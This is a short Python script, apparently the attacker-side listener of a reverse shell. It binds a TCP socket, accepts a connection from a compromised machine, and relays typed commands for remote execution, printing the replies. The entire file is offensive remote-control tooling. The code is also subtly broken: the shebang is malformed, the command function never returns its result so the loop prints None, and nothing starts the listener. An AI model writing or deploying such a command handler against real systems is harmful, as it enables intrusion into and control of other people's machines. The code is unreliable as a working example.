#/usr/bin/env python
import socket

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)

        print("[+] listening for incoming connections")

        self.connection, adress = listener.accept()

        print("[+] Connection establishedfrom" + str(adress))
    def execute_remotely(self, command):
            self.connection.send(command)
            result =self. connection.recv(1024)
    def run(self):
        while True:
            command = raw_input(">> ")
            result = self.execute_remotely(command)
            print(result)
